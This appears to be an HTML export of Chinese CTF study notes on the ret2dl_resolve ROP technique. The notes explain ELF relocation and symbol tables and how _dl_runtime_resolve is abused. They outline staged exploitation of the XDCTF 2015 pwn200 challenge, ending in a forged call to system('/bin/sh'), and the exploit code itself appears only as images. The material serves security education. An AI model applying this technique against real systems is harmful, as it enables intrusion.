@@ -1,0 +1,2223 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN7</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="4nb32ujn1msecp4tl5om9j418b">CTF PWN7</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN7_files/images/CTF PWN7.jpg"></div>
+<h2 class="topic">
+<a name="5gttkej2meo9t6rk14chlle8qa">栈溢出</a>
+</h2>
+<h3 class="topic">
+<a name="75r7ivfj18cpubut2kr9njfdi0">&nbsp;高级rop</a>
+</h3>
+<h3 class="topic">
+<a name="03ocfl94j19nu82ch6fre9tmv9">&nbsp;&nbsp;与一般的rop相比，只是利用了更加底层的原理</a>
+</h3>
+<h3 class="topic">
+<a name="17naeg3veqidvhn9e1iqats6ks">&nbsp;&nbsp;&nbsp;el文件格式解析，https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/</a>
+</h3>
+<h3 class="topic">
+<a name="4ulsev7q852nsjkg5o9ia6fp9f">&nbsp;&nbsp;ret2_dl_runtime_resolve</a>
+</h3>
+<h3 class="topic">
+<a name="61g287mnqsrnui3okmpe2ovg5i">&nbsp;&nbsp;&nbsp;程序第一次调用api时，会通过访问相应的PLT表项，进一步调用函数_dl_runtime_resolve(link_map_obj, reloc_index)从而将正确的函数地址填入对应GOT表项中</a>
+</h3>
+<h3 class="topic">
+<a name="71nu8mvevm485ff7mmktmdvkgf">&nbsp;&nbsp;&nbsp;&nbsp;dl_runtime_resolve(link_map_obj, reloc_index)函数调用过程</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2khppc5snp32m1r564rl1203k6.png"></p>
+<h3 class="topic">
+<a name="61sifn3h75q2ml0tk6q0fd1stn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dl_runtime_resolveh函数的执行过程&#13;
+&#13;
+以reloc_index作为偏移获得对应重定位表项中的r_info&#13;
+&#13;
+r_info&gt;&gt;8获得函数对应符号表项的在动态链界符号表中的下标&#13;
+&#13;
+判断符号类型，看该符号对应的函数地址是否已经被解析过&#13;
+&#13;
+符号表项中的st_name即对应的符号在字符串表中的下标&#13;
+&#13;
+通过函数名称字符串搜索函数地址，填入重定位表中r_offset起始的内存位置&#13;
+&#13;
+调用该函数</a>
+</h3>
+<h3 class="topic">
+<a name="1ppr8gf97bc1l6khvd6qba4map">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有关_dl_runtime_resolve函数</a>
+</h3>
+<h3 class="topic">
+<a name="3jup3731t34kmq9io09foijmlg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret2dl_resolve的原理：&#13;
+动态链接相关函数_dl_runtime_resolve(link_map_obj, reloc_index)&#13;
+功能：在第一次调用某函数时运行，绑定其地址到对应的GOT表项&#13;
+第一个参数link_map_obj恒为GOT[1]的地址&#13;
+第二个参数reloc_index为被绑定函数在.rel.plt段中的相对偏移 &#13;
+&#13;
+原理：&#13;
+调用_dl_runtime_resolve,修改reloc_index，令其指向伪造在栈中的重定向表表项&#13;
+	- 伪造重定向表表项，修改第二项中的符号表索引，令其指向伪造在栈中的符号表表项&#13;
+	--伪造符号表表项，修改第一项（字符串表偏移），令其指向伪造在栈中的字符串（&rsquo;system&rsquo;）&#13;
+	令该函数的参数为写入在栈中的&rsquo;/bin/sh\x00&rsquo;的地址，即可getshell&#13;
+&#13;
+ret2dl_resolve的前提:&#13;
+1.非Full RELRO      -z lazy/norelro&#13;
+2.无PIE              -no-pie&#13;
+3.能够溢出           -fno-stack-protector</a>
+</h3>
+<h3 class="topic">
+<a name="5ctd01at6sphhd6se2juaik5vu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_dl_runtime_resolve函数具体运行模式&#13;
+首先总的来说一下_dl_runtime_resolve函数如何使程序第一次调用一个函数：&#13;
+首先用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址；&#13;
+.rel.plt + 参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;&#13;
+rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;&#13;
+.dynstr + sym-&gt;st_name得出符号名字符串指针;&#13;
+在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表;&#13;
+最后调用这个函数；</a>
+</h3>
+<h3 class="topic">
+<a name="0vt327ncq5g70e2k5co6ea63du">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于_dl_runtime_resolve函数的调用</a>
+</h3>
+<h3 class="topic">
+<a name="28g9ql6vi4e4e69aah35nja96m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指令序列 &#13;
+push n&#13;
+push moduleID&#13;
+jmp dl_rutime_resolve &#13;
+用于完成函数符号的解析和重定位工作，完成后会将函数的地址填入GOT中，下次该函数再次执行，就可以直接完成调用</a>
+</h3>
+<h3 class="topic">
+<a name="3qv3s7bhbdciist13vbcg44uii">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push n中n为对应函数在重定位表.rel.plt中的偏移（注意不是下标，32位系统中，重定位表中一个表项8字节，所以这里的n为rel.plt表下标*8），对应reloc_index</a>
+</h3>
+<h3 class="topic">
+<a name="47kotv9eudb3n74stf75b4ch47">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push moduleID中moduleID为该函数所在模块的id 对应link_map_obj 即.got.plt[1]中的数据</a>
+</h3>
+<h3 class="topic">
+<a name="2iqapveqionl860u709l3k1s58">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dl_rutime_resolve是动态链接器的函数，用于完成符号解析和重定位</a>
+</h3>
+<h3 class="topic">
+<a name="48pkktjflskve7tkakplrn8pjj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以函数关键在于参数reloc_index实际上是目标函数在重定位表（rel.plt）表中距离表首地址的偏移而并非仅仅是对应表项的下标</a>
+</h3>
+<h3 class="topic">
+<a name="5ve0n7nemj17surar519f9mrln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并且根据上述内容我们可知：_dl_runtime_resolve函数执行完成后（完成对应的GOT表项填充）还会调用一次被重定位的函数</a>
+</h3>
+<h3 class="topic">
+<a name="462mo8sjnnl14nhfoo1sh008f0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于GOT表的结构</a>
+</h3>
+<h3 class="topic">
+<a name="5gbnho3qgpm2e70b3cbjm0o59t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3u8f1ckus2n8kcnn1flpthpiu9.png"></p>
+<h3 class="topic">
+<a name="16f3diegq3k45me7vev6ei8drv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于重定位表</a>
+</h3>
+<h3 class="topic">
+<a name="0bc84oa3q1o7i8rjujfekn1et4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;静态链接重定位表(.rel.text   .rel.data)结构</a>
+</h3>
+<h3 class="topic">
+<a name="161ndasugeh3qb6sl2v61cf5i2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rel.data 存储.data的重定位信息&#13;
+.rel.text 存储.text的重定位信息</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3im1qj2cltq1kihq8vf45s55rh.png"></p>
+<h3 class="topic">
+<a name="4vv22t29be03iaqp2s3idr4v88">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于每一个需要重定位的段，都有一个重定位表与之对应</a>
+</h3>
+<h3 class="topic">
+<a name="0m8ure6dlutpu14qa2f764430k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表的结构</a>
+</h3>
+<h3 class="topic">
+<a name="1rbl568beajc623csj6a99kmm4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7hutenrrntll6rmacjkm7m81ci.png"></p>
+<h3 class="topic">
+<a name="323u225r92k7142ffqm2i4730g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7v5qildob16f63ameqrb5or64m.png"></p>
+<h3 class="topic">
+<a name="6uprffvormud78genlrf46abok">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到32位的重定位表项占8个字节</a>
+</h3>
+<h3 class="topic">
+<a name="0brpqd0etc9njuehjk3hgfak6p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r_info高24位表示重定位入口的符号在符号表中的下标，低八位表示重定位入口点的类型，所以如果要获得重定位入口点符号在符号表中的下标，需要 r_info&gt;&gt;8 即右移8位</a>
+</h3>
+<h3 class="topic">
+<a name="66r5j73dpb6i8i0j7h84hm0t2i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接重定位表</a>
+</h3>
+<h3 class="topic">
+<a name="62lpcqpi9tkigrbi81pp661lkl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接时，不论可执行文件或共享对象，一旦引用其他共享对象，就会有导入符号，就会需要被重定位</a>
+</h3>
+<h3 class="topic">
+<a name="6os7doijplam93cqpfb3qbt5u1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接的可执行文件或共享对象即使是PIC编译的，也会需要重定位</a>
+</h3>
+<h3 class="topic">
+<a name="5vbhcn05b65b71dkjf1ap4ubtl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然使用了PIC，代码段不需要重定位，但是数据端还需要被重定位，因为PIC通过将代码段中的重定位项分离出来，形成了GOT表，GOT表需要在加载的时候被填充</a>
+</h3>
+<h3 class="topic">
+<a name="2gbi6ogrn80cfdvk0os89ck9c8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据段处了GOT表还有其他绝对地址引用</a>
+</h3>
+<h3 class="topic">
+<a name="7v3nl7oq0if2tlbfld3vo8ep3q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接的重定位与静态链接的重定位类似，只不过发生的时机不一样</a>
+</h3>
+<h3 class="topic">
+<a name="59c67teg6g1pidmlkctc4lb0f4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相关结构</a>
+</h3>
+<h3 class="topic">
+<a name="4foe02664gun2hdk1rkr726fu8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rel.dyn</a>
+</h3>
+<h3 class="topic">
+<a name="5269cq3plkb6lt00h769trn96c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相当于静态链接中的.rel.data</a>
+</h3>
+<h3 class="topic">
+<a name="000v4svbu40ad1tjtk3lkb71st">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修正位置位于.got和数据段</a>
+</h3>
+<h3 class="topic">
+<a name="5ufg083te5kj0c67i0dqfkuuol">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rel.plt</a>
+</h3>
+<h3 class="topic">
+<a name="77io000rk0up2tead312n15u2v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相当于静态链接中的.rel.text</a>
+</h3>
+<h3 class="topic">
+<a name="65lrk6vtkk3qba7o8vb6uhh2k9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修正位置位于.got.plt</a>
+</h3>
+<h3 class="topic">
+<a name="2u6fri7hd0om6cv9d92jh8u89q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相对于静态链接，动态链接中新的重定位类型</a>
+</h3>
+<h3 class="topic">
+<a name="21blc0bp6v98qbt9pi8upu30db">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/42r92gpn02fjc3j871hse6509o.png"></p>
+<h3 class="topic">
+<a name="02muj7hc9b13i4lepqgdppf50q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7j0i7n63i6u4j6lnkgsr4mufav.png"></p>
+<h3 class="topic">
+<a name="4q17pnlg9enrkdtb62em1vf9tf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2nubct6q2ucdn5rrkocok6agv7.png"></p>
+<h3 class="topic">
+<a name="72amceir0bvssfceqi19totfrj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位时填入符号的地址即可</a>
+</h3>
+<h3 class="topic">
+<a name="6m0ldikbnns11305q22361lh1e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;的重定位</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3juj78t02q4lhn5jp7ma50ce41.png"></p>
+<h3 class="topic">
+<a name="4v68to8lt5lnsabma3poekohde">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1e98na5fg5n4p1evjorbpcbbdq.png"></p>
+<h3 class="topic">
+<a name="32f0o2u37a14dq401d17b9rgrg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位时填入符号的地址即可</a>
+</h3>
+<h3 class="topic">
+<a name="5lhg07umfikit0p9rola4dra03">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/6ldvsj0b85179b2gcd5i4f97h2.png"></p>
+<h3 class="topic">
+<a name="7fiqd14ujrgsflu6lfccqkeq2g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一个elf文件以PIC模式编译，则其引用的外部函数的重定位信息保存在.rel.plt中，如果elf不是以PIC编译，则其引用的外部函数的重定位信息保存在.rel.dyn中</a>
+</h3>
+<h3 class="topic">
+<a name="5f2epk9l5n6muas6ulnud17jrr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表的结构</a>
+</h3>
+<h3 class="topic">
+<a name="65l29aq1irok4qi9ocvhs035n9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0q94ohnnaeciidgncms53rbo44.png"></p>
+<h3 class="topic">
+<a name="641rlvi96jlo6jhlcooknrenl2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/04r28qchum7jqcjaq72f7p0115.png"></p>
+<h3 class="topic">
+<a name="3sco4r0dhh0otlrlk230hr1mut">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于动态链接符号表和.dynamic段</a>
+</h3>
+<h3 class="topic">
+<a name="1a41dnd2ojun2sbqba9jbhgjso">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.dynamic段</a>
+</h3>
+<h3 class="topic">
+<a name="7isqdufudv56ovfujii6a1uq0l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;存在于动态链接ELF文件中，保存了动态链接器所需要的基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="6r00i4s5o52ilvp27th5fcspu5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;包含重要信息：所依赖的共享对象的文件、其他与动态链接有关的表的地址，共享对象初始化代码地址等</a>
+</h3>
+<h3 class="topic">
+<a name="6pbrel73lp0ii44q3hu526jp29">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意该段可以类比elf头，elf投中保存的均是静态链接相关的内容（符号表，重定位表等），而.dynamic可以看成动态链接中的elf文件头</a>
+</h3>
+<h3 class="topic">
+<a name="2fusjfoluuvlgc62k3nmq7rv9h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个结构体数组</a>
+</h3>
+<h3 class="topic">
+<a name="6kogq8aa1g4q2md9g7l05h7sbp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1pdmle8ausbs0qbnb9opmd0uk6.png"></p>
+<h3 class="topic">
+<a name="6bqi505sab94imvjhd3f92n7ph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/6l45rnd99sta2kvarcphjvc4be.png"></p>
+<h3 class="topic">
+<a name="38ujdn314lnqpsoggeloatl22p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2tqp9sd35hucf16689h9epofri.png"></p>
+<h3 class="topic">
+<a name="4q4tpfcsogohad7tqnb9k3lva1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态符号表.dynsym</a>
+</h3>
+<h3 class="topic">
+<a name="4l1addhml253nmg66uv5dj4hlu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;结构与静态链接的符号表几乎一样，但是进保存了与动态链接相关的符号，不保存模块内部的符号，</a>
+</h3>
+<h3 class="topic">
+<a name="0m2msingh5qq7jmj31h7noqmfr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;符号表 .symtab中往往保存了所有符号，包括.dynsym中的符号</a>
+</h3>
+<h3 class="topic">
+<a name="20p7qjofi1u0pmfhqjcovo4msj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要一些辅助表</a>
+</h3>
+<h3 class="topic">
+<a name="6h3bf4uqiu8cna0sctg3ibhqal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保存符号名称的动态符号字符串表 .dynstr</a>
+</h3>
+<h3 class="topic">
+<a name="58gih516r8e5ml1o9ekkv9d0mj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对应静态链接中的字符串表 .strtab</a>
+</h3>
+<h3 class="topic">
+<a name="47eanablvdhggg4p96sca13qgk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;符号哈希表 .hash</a>
+</h3>
+<h3 class="topic">
+<a name="4fgnqm4m24dvb2mbbip02kued6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;符号表结构体</a>
+</h3>
+<h3 class="topic">
+<a name="054cfpsoavgr4gkgh8rjqvncr5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态符号表结构与静态符号表结构相同</a>
+</h3>
+<h3 class="topic">
+<a name="29li5idn2hc24sm7vj02da7sjg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/55stsnuostos6g051ab8b8l81m.png"></p>
+<h3 class="topic">
+<a name="3lo7i2s8g7fofva99da5crcpn9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意结构体中前三个成员大小均为4字节  第四、五成员数据类型均为unsigned char所以各占1字节，最后一个成员数据类型为Elf32_Half，占2字节，故该结构题一共占16字节</a>
+</h3>
+<h3 class="topic">
+<a name="509ihi0ifdolbquivvissroae6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意st_name所谓的符号名在字符串表中的下标指的是指定字符串相对于字符串首地址的偏移，而不是类似数组下标的概念</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4lrkg4dfda79rqnvu5n6di6rv6.png"></p>
+<h3 class="topic">
+<a name="57vnp2ormija3bpsjv1jgo9274">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a name="59c9l05o4fml6l79iv5354qb13">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.pediy.com/thread-250703.htm</a>
+</h3>
+<h3 class="topic">
+<a name="415jkp139par9mcldkulqk5b4o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/sopora/article/details/92590933</a>
+</h3>
+<h3 class="topic">
+<a name="7isnpv26pf2gp3kg45hivvsdar">&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="6g3sdanqc1723stdlsb6mvkb4l">&nbsp;&nbsp;&nbsp;&nbsp;通过结合dl_runtime_resolve(link_map_obj, reloc_index)函数执行过程，发现主要通过伪造重定位表项的方式，执行该函数，从而解析我们指定的函数的地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/144orq44bbvna977j6ufoscuev.png"></p>
+<h3 class="topic">
+<a name="1rv4iakd66mfqvd8qkk6bktsk5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用前提</a>
+</h3>
+<h3 class="topic">
+<a name="534fbm3mcgs8uhrt2n87eo8jit">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5irrel63sq0oj2ophq5qjjnc62.png"></p>
+<h3 class="topic">
+<a name="1lbvtjr6v51gcucm2pu0cpqr09">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;攻击适用范围</a>
+</h3>
+<h3 class="topic">
+<a name="1ddgjt9ue3f0hnfts00qimtrpn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。（即通过之前技巧无法轻易泄露函数的地址，只能通过该方法获得函数地址）</a>
+</h3>
+<h3 class="topic">
+<a name="6j868r7287iinbbf0kovsh0fdm">&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="28ehadblpp845l908or9e03o4b">&nbsp;&nbsp;&nbsp;&nbsp;题目：XDCTF 2015的pwn200</a>
+</h3>
+<h3 class="topic">
+<a name="6vufi4ndhu3nvn6kr16vcoeul6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入浅出。</a>
+</h3>
+<h3 class="topic">
+<a name="3ofo5sdv99h7votlf38du8duq3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.math1as.com/index.php/archives/341/</a>
+</h3>
+<h3 class="topic">
+<a name="7lps9r546slq12411k3ji4571m">&nbsp;&nbsp;&nbsp;&nbsp;两种攻击方式</a>
+</h3>
+<h3 class="topic">
+<a name="6m1262kcdcfqvgnbug2jpsh8ha">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正常攻击</a>
+</h3>
+<h3 class="topic">
+<a name="17bil8hf763ql871ne8flhevff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;思路</a>
+</h3>
+<h3 class="topic">
+<a name="4jk226dau3mv42sp91igpnceq0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage 1 测试控制程序执行write函数的效果。</a>
+</h3>
+<h3 class="topic">
+<a name="021i3fmu86k5gcdvpdpd32b9ja">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。</a>
+</h3>
+<h3 class="topic">
+<a name="6i0sihdfbjba3ojrr21qor86i1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即通过溢出，调用_dl_runtime_resolve函数获得write函数地址，当_dl_runtime_resolve执行完成后会自动调用worite函数</a>
+</h3>
+<h3 class="topic">
+<a name="48sfr31uh5g8u6ah8q6kv6lkpb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。</a>
+</h3>
+<h3 class="topic">
+<a name="29ua0q0jf2si1n38b2m7mcn0el">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;具体过程</a>
+</h3>
+<h3 class="topic">
+<a name="1ufq19vpm49md9o69tarmvt63b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过gef生成不规则字符串，确定函数溢出偏移</a>
+</h3>
+<h3 class="topic">
+<a name="06t0k7idcen4bsparcl5pan045">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/419uood7ealodmulhrc562dcmg.png"></p>
+<h3 class="topic">
+<a name="2jsibqdhgjflvkcke0l9iu57m2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/42nptkc11hms6i92gc4m3e2a4p.png"></p>
+<h3 class="topic">
+<a name="44ddlo494pshed5njpef0gpa78">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage 1（通过栈迁移技巧，直接调用write函数）</a>
+</h3>
+<h3 class="topic">
+<a name="4bdo7tt6hv0ree4o2i811rckvd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过栈迁移技巧将栈切换到bss段，并控制write函数输出相应字符串</a>
+</h3>
+<h3 class="topic">
+<a name="1745phbj44hbb1updsm3chq5eh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4oc89r72jiqd14rj2hfp0ufp53.png"></p>
+<h3 class="topic">
+<a name="1jtiuepp663im50le2glccdpeu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行效果:即调用write函数输出'/bin/sh'字符串</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7sbjk8sbrarvrpjbkg0kjhr6re.png"></p>
+<h3 class="topic">
+<a name="148tuta3vs1u75ictsjh5lctmf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage 2（通过调用_dl_runtime_resolve函数解析write函数地址同时调用wirte函数）</a>
+</h3>
+<h3 class="topic">
+<a name="1r4l0iepeae3ctafo0u5ohpgar">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt表在内存中的实际结构，为避免代码重复plt表一开始就存放了跳转到函数dl_runtime_resolve(link_map_obj, reloc_index)中执行代码</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/16ehqmkq33q4c1q4j3ecan06kb.png"></p>
+<h3 class="topic">
+<a name="3rpf4b8t4vuca6hia6cmb1pffp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里write_index*=8的意思应该是计算write函数在.rel.plt表中的偏移，因为32位linux中重定位表项占8字节，所以通过下标*8，可以得到偏移&#13;
+这其中也隐含了一个事实，plt表项与rel.plt表项是一一对应的，相同的函数在两张表中下标相同&#13;
+当_dl_runtime_resolve执行完成后，会自动调用write函数，函数参数为我们设置好的&#13;
+write(1,base_stage+80,len(sh))</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0gv232rovfu00a0rf842f94io8.png"></p>
+<h3 class="topic">
+<a name="5mt4cn834p4mhm620flmae740n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行效果:即调用write函数输出'/bin/sh'字符串</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4tl2rnoi84esnctvodo7avvri3.png"></p>
+<h3 class="topic">
